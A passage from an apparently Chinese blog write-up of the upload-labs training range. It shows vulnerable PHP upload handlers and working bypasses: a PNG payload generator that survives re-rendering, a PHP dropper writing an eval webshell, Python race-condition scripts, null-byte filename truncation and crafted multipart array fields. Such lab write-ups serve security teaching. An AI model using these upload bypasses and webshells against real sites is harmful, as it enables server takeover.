class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</div><div class="line">                imagejpeg($im,$img_path);</div><div class="line">                @unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">"上传出错！"</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefrompng($target_path);</div><div class="line"></div><div class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</div><div class="line">                @unlink($target_path);</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                 <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</div><div class="line">                imagepng($im,$img_path);</div><div class="line"></div><div class="line">                @unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;               </div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">"上传出错！"</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</div><div class="line">            <span class="comment">//使用上传的图片生成新的图片</span></div><div class="line">            $im = imagecreatefromgif($target_path);</div><div class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</div><div class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</div><div class="line">                @unlink($target_path);</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="comment">//给新图片指定文件名</span></div><div class="line">                srand(time());</div><div class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</div><div class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></div><div class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</div><div class="line">                imagegif($im,$img_path);</div><div class="line"></div><div class="line">                @unlink($target_path);</div><div class="line">                $is_upload = <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $msg = <span class="string">"上传出错！"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>imagepng()二次渲染。</p>
<p>上传 使用第十三关的图片马时，图片会被二次渲染，里面的一句话会被清除，因此需要制作一张二次渲染过后，一句话依旧存在的图片马。</p>
<p>下列代码，可以制作一张二次渲染过后，恶意代码依旧存在的png图片马。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//png.php</span></div><div class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0xe</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>, <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>, <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x1</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>, <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</div><div class="line"></div><div class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</div><div class="line"></div><div class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</div><div class="line">   $r = $p[$y];</div><div class="line">   $g = $p[$y+<span class="number">1</span>];</div><div class="line">   $b = $p[$y+<span class="number">2</span>];</div><div class="line">   $color = imagecolorallocate($img, $r, $g, $b);</div><div class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</div><div class="line">&#125;</div><div class="line"></div><div class="line">imagepng($img,<span class="string">'./1.png'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>用法:<br><code>php.exe png.php</code><br>生成1.png</p>
<p>上传生成的1.png:<br><img src="/2020/01/05/upload-labs-writeup/upload-lab16-01.png" alt="upload-lab16-01"></p>
<p>文件包含：<br><img src="/2020/01/05/upload-labs-writeup/upload-lab16-02.png" alt="upload-lab16-02"></p>
<h2 id="Pass18"><a href="#Pass18" class="headerlink" title="Pass18"></a>Pass18</h2><p>多线程上传，条件竞争。</p>
<p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line">$file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</div><div class="line">$temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">$file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">$upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</div><div class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</div><div class="line">         $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</div><div class="line">         rename($upload_file, $img_path);</div><div class="line">         $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</div><div class="line">        unlink($upload_file);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>逻辑：先移动，后检测，不符合再删除，符合则改名字。</p>
<p>上传文件名是<code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;];</code>可控。</p>
<p>因此我们可以用burp一直发上传包，让php程序一直处于移动php文件到upload目录这个阶段。</p>
<p>burp配置：<br><img src="/2020/01/05/upload-labs-writeup/upload-lab17-01.png" alt="upload-lab17-01"></p>
<p>php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?PHP</span> <span class="keyword">echo</span> md5(<span class="number">1</span>);fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="/2020/01/05/upload-labs-writeup/upload-lab17-02.png" alt="upload-lab17-02"></p>
<p>然后写个python脚本一直访问上传的php文件,生成新的shell。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	i=<span class="number">0</span></div><div class="line">	<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			print(i,end=<span class="string">'\r'</span>)</div><div class="line">			a = requests.get(<span class="string">"http://192.168.142.142/upload/write.php"</span>)</div><div class="line">			<span class="keyword">if</span> <span class="string">"c4ca4238a0b923820dcc509a6f75849b"</span> <span class="keyword">in</span> a.text:</div><div class="line">				print(<span class="string">"yeah!!!"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">			<span class="keyword">pass</span></div><div class="line">		i+=<span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure></p>
<p>结果:<br><img src="/2020/01/05/upload-labs-writeup/upload-lab17-03.png" alt="upload-lab17-03"></p>
<h2 id="Pass19"><a href="#Pass19" class="headerlink" title="Pass19"></a>Pass19</h2><p>这关代码有点小问题，上传的文件没有在upload目录下，而是文件名前多了个upload，像这样的<code>../upload1578389650.jpg</code>,更改下Pass-19/myupload.php文件，</p>
<p>将103行的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">$this</span>-&gt;cls_upload_dir = $dir;</div></pre></td></tr></table></figure></p>
<p>改为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">$this</span>-&gt;cls_upload_dir = $dir.<span class="string">'/'</span>;</div></pre></td></tr></table></figure></p>
<p>这样 文件上传上来就在upload目录下了。<code>../upload/1578389689.jpg</code>。</p>
<p>其实你不改也可以，就是WWW目录下会有很多文件，强迫症就难受了，hhh~。</p>
<p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">$ret = <span class="keyword">$this</span>-&gt;checkExtension(); <span class="comment">//检查后缀，必须是下列数组中的后缀。</span></div><div class="line"><span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</div><div class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</div><div class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</div><div class="line"></div><div class="line">$ret = <span class="keyword">$this</span>-&gt;checkSize();  <span class="comment">//检查大小</span></div><div class="line"></div><div class="line">$ret = <span class="keyword">$this</span>-&gt;checkFileExists(); <span class="comment">//检查文件是否已存在</span></div><div class="line"></div><div class="line">$ret = <span class="keyword">$this</span>-&gt;move(); <span class="comment">// 移动文件</span></div><div class="line"></div><div class="line">$ret = <span class="keyword">$this</span>-&gt;renameFile(); <span class="comment">// 改名字。</span></div><div class="line"></div><div class="line">$u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</div><div class="line">    </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyUpload</span><span class="params">( $file_name, $tmp_file_name, $file_size, $file_rename_to = <span class="string">''</span> )</span></span>&#123;</div><div class="line">  </div><div class="line">    <span class="keyword">$this</span>-&gt;cls_filename = $file_name;</div><div class="line">    <span class="keyword">$this</span>-&gt;cls_tmp_filename = $tmp_file_name;</div><div class="line">    <span class="keyword">$this</span>-&gt;cls_filesize = $file_size;</div><div class="line">    <span class="keyword">$this</span>-&gt;cls_file_rename_to = $file_rename_to;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="comment">//$this-&gt;cls_filename 是$_FILES['upload_file']['name']</span></div><div class="line">    <span class="keyword">if</span>( move_uploaded_file( <span class="keyword">$this</span>-&gt;cls_tmp_filename, <span class="keyword">$this</span>-&gt;cls_upload_dir . <span class="keyword">$this</span>-&gt;cls_filename ) == <span class="keyword">false</span> )&#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">"MOVE_UPLOADED_FILE_FAILURE"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>关键函数<code>move()</code>，先移动到upload目录下，在更改文件名<code>$this-&gt;renameFile()</code>。</p>
<p>跟17关一样，条件竞争，只是第十八关校验了后缀，这里没有提示使用文件包含，那么考虑<a href="https://www.lxhsec.com/2019/03/04/middleware/#%E6%9C%AA%E7%9F%A5%E6%89%A9%E5%B1%95%E5%90%8D%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><code>Apache未知扩展名解析漏洞</code></a>。</p>
<p>综上所述，我们可以使用burp一直发上传包，然后写个python小工具一直请求还没有进行<code>renameFile</code>的文件，该文件也就是<code>move_uploaded_file</code>函数参数中的<code>$this-&gt;cls_upload_dir . $this-&gt;cls_filename</code>，再配合Apache未知扩展名解析漏洞，获取webshell。</p>
<p>其中<code>$this-&gt;cls_upload_dir</code> 也就是 <code>define(&quot;UPLOAD_PATH&quot;, &quot;../upload/&quot;);</code>，<code>$this-&gt;cls_filename</code> 是<code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>。</p>
<p>burp配置与17关相同，这里选择上传<code>.7z</code>后缀文件，试了下<code>.rar</code>,<code>.zip</code>发现Apache都认识，我们需要上传Apache不认识的后缀，它才会继续向前解析。</p>
<p>python代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	i=<span class="number">0</span></div><div class="line">	<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			print(i,end=<span class="string">'\r'</span>)</div><div class="line">			a = requests.get(<span class="string">"http://192.168.142.142/upload/write.php.7z"</span>)</div><div class="line">			<span class="keyword">if</span> <span class="string">"c4ca4238a0b923820dcc509a6f75849b"</span> <span class="keyword">in</span> a.text:</div><div class="line">				print(<span class="string">"yeah!!!"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">			<span class="keyword">pass</span></div><div class="line">		i+=<span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure></p>
<p>结果：<br><img src="/2020/01/05/upload-labs-writeup/upload-lab18-01.png" alt="upload-lab18-01"></p>
<h2 id="Pass20"><a href="#Pass20" class="headerlink" title="Pass20"></a>Pass20</h2><p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</div><div class="line"></div><div class="line">$file_name = $_POST[<span class="string">'save_name'</span>];</div><div class="line">$file_ext = pathinfo($file_name,PATHINFO_EXTENSION); <span class="comment">// 获取后缀</span></div><div class="line"></div><div class="line"><span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $msg = <span class="string">'上传出错！'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>与12关类似，POST 参数save_name可控，当输入<code>upload-19.php%00.jpg</code>时，<code>pathinfo</code>获取的<code>$file_ext</code>是<code>.jpg</code>,从而进入了if代码块。<br><img src="/2020/01/05/upload-labs-writeup/upload-lab19-01.png" alt="upload-lab19-01"></p>
<p>当<code>$img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;</code>拼接时，%00后面的数据又会被截断，从而上传了webshell。<br><img src="/2020/01/05/upload-labs-writeup/upload-lab19.png" alt="upload-lab19"></p>
<h2 id="Pass21"><a href="#Pass21" class="headerlink" title="Pass21"></a>Pass21</h2><p>代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</div><div class="line"><span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</div><div class="line">    $msg = <span class="string">"禁止上传该类型文件!"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先检查了MIME，更改<code>Content-Type: image/png</code>即可绕过。</p>
<p>接下来<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">$file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</div><div class="line"></div><div class="line"><span class="comment">//empty($_POST['save_name'])默认有值，所以会返回false，也就是$file=$_POST['save_name'];</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</div><div class="line">	<span class="comment">//默认情况下$file不是数组，因此执行了explode.</span></div><div class="line">    $file = explode(<span class="string">'.'</span>, strtolower($file));</div><div class="line">&#125;</div><div class="line"></div><div class="line">$ext = end($file); <span class="comment">// $file数组的最后一个值要是jpg or png or gif.</span></div><div class="line"></div><div class="line">$allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</div><div class="line">    $msg = <span class="string">"禁止上传该后缀文件!"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="comment">//数组的第一个值 拼接 $file[1]。正常情况下是$ext.</span></div><div class="line">    $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</div><div class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</div><div class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</div><div class="line">        $msg = <span class="string">"文件上传成功！"</span>;</div><div class="line">        $is_upload = <span class="keyword">true</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $msg = <span class="string">"文件上传失败！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>上述是正常情况下的走法。</p>
<p>绕过点在于：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</div><div class="line">	<span class="comment">//默认情况下$file不是数组，因此执行了explode.</span></div><div class="line">    $file = explode(<span class="string">'.'</span>, strtolower($file));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>如果走了explode，$file 最后一个必须要是<code>jpg</code> or <code>png</code> or <code>gif</code>,$file值也就 只能  xxx.jpg or xxx.php.jpg，到了<br><code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>这一步，文件名永远也是xxx.jpg</p>
<p>因此 必须不走explode，数组的值就可以任意操控。</p>
<p>不走explode的情况下，我们需要让<code>$file</code>是数组，让<code>is_array($file)</code>返回true.</p>
<p>也就是要这样构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</div><div class="line"></div><div class="line">upload-20.php</div><div class="line">------WebKitFormBoundarybJWFS5X7mmp8T1s8</div><div class="line">Content-Disposition: form-data; name=&quot;save_name[1]&quot;</div><div class="line"></div><div class="line">xxx</div></pre></td></tr></table></figure></p>
<p>接下来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ext = end($file); <span class="comment">// $file数组的最后一个值要是jpg or png or gif.</span></div><div class="line"></div><div class="line">$allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</div><div class="line"><span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</div><div class="line">    $msg = <span class="string">"禁止上传该后缀文件!"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="comment">//....</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>$file数组最后一个必须为jpg or png or gif.<br>也就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</div><div class="line"></div><div class="line">upload-20.php</div><div class="line">------WebKitFormBoundarybJWFS5X7mmp8T1s8</div><div class="line">Content-Disposition: form-data; name=&quot;save_name[1]&quot;</div><div class="line"></div><div class="line">jpg</div></pre></td></tr></table></figure></p>
<p>再接着取数组的第一个和 数组总数-1的序号拼接。<br><code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code></p>
<p>当数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</div><div class="line"></div><div class="line">upload-20.php</div><div class="line">------WebKitFormBoundarybJWFS5X7mmp8T1s8</div><div class="line">Content-Disposition: form-data; name=&quot;save_name[1]&quot;</div><div class="line"></div><div class="line">jpg</div></pre></td></tr></table></figure></p>
<p>结果如下：<br><code>../upload//upload-20.php.jpg</code><br><img src="/2020/01/05/upload-labs-writeup/upload-lab20-01.png" alt="upload-lab20-01"></p>
<p>这里我们要让jpg为空，利用windows文件名不允许<code>.</code>结尾特性，获取shell。</p>
<p>当数组大小为2时，让$file[1]要为空，<br>也就是将<code>save_name[1]</code>改为<code>save_name[2]</code>，最终如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data; name=&quot;save_name[0]&quot;</div><div class="line"></div><div class="line">upload-20.php</div><div class="line">------WebKitFormBoundarybJWFS5X7mmp8T1s8</div><div class="line">Content-Disposition: form-data; name=&quot;save_name[2]&quot;</div><div class="line"></div><div class="line">jpg</div><div class="line">------WebKitFormBoundarybJWFS5X7mmp8T1s8</div></pre></td></tr></table></figure></p>
<p>Windows下 使用<code>.</code>特性绕过。<br><img src="/2020/01/05/upload-labs-writeup/upload-lab20-02.png" alt="upload-lab20-02"></p>
<p>Linix下 使用<code>/.</code>绕过（move_uploaded_file函数执行时 会忽略掉文件名末尾的<code>/.</code>）<br><img src="/2020/01/05/upload-labs-writeup/upload-lab20-03.png" alt="upload-lab20-03"></p>
<p><strong>ps:</strong> 21关这个代码，不清楚这样写的意义，一般情况下php开发，也不会写的这么绕…</p>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p><img src="/2020/01/05/upload-labs-writeup/file-upload-summary.png" alt="file-upload-summary"></p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
